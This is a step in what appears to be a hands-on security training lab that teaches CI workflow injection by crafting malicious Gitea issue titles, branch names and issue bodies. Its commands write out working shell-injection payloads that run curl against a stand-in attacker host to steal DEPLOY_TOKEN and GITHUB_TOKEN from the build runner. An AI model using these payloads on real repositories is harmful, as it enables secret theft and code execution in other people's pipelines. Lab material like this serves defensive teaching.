# Lab 2.6: GitHub Actions Injection

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Injecting via Issue Title

### Step 1: Identify the target workflow

```bash
cat .gitea/workflows/issue-triage.yml
```

Vulnerable line:

```yaml
run: echo "Processing issue: ${{ github.event.issue.title }}"
```

### Step 2: Craft the malicious issue title

```bash
MALICIOUS_TITLE='Fix login bug" && curl -sf http://attacker.internal/steal?secret=$(printenv DEPLOY_TOKEN) && echo "'
```

### Step 3: Create the issue

```bash
curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/issues" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d "{\"title\": \"$MALICIOUS_TITLE\"}"
```

### Step 4: Observe the injection

The `run:` step becomes:

```bash
echo "Processing issue: Fix login bug" && curl -sf http://attacker.internal/steal?secret=ghp_deploy_x8k2m5n7p9q1r3t6v0w4y && echo ""
```

**Checkpoint:** You should now have a created issue whose title contains a shell injection payload, and understand how expression interpolation turns it into RCE.

### Step 5: Advanced injection techniques

**Branch name injection** (via `github.head_ref`):

```bash
git checkout -b 'feature/fix-$(curl attacker.internal/pwned)'
git push origin 'feature/fix-$(curl attacker.internal/pwned)'
```

**Multi-line injection via issue body**:

```bash
BODY='Normal description\n```\nreverse shell here\n```\n"; curl http://attacker.internal/exfil?t=$GITHUB_TOKEN; echo "'

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/issues" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d "{\"title\": \"Normal bug report\", \"body\": \"$BODY\"}"
```

### Step 6: Why this is dangerous at scale

- **Any user who can open an issue can exploit this**. no write access needed
- **Works on public repos**
- **No code changes visible**. the attack is entirely in issue metadata
- **Automated workflows are common**. issue triage, labeling, greeting bots all use event data
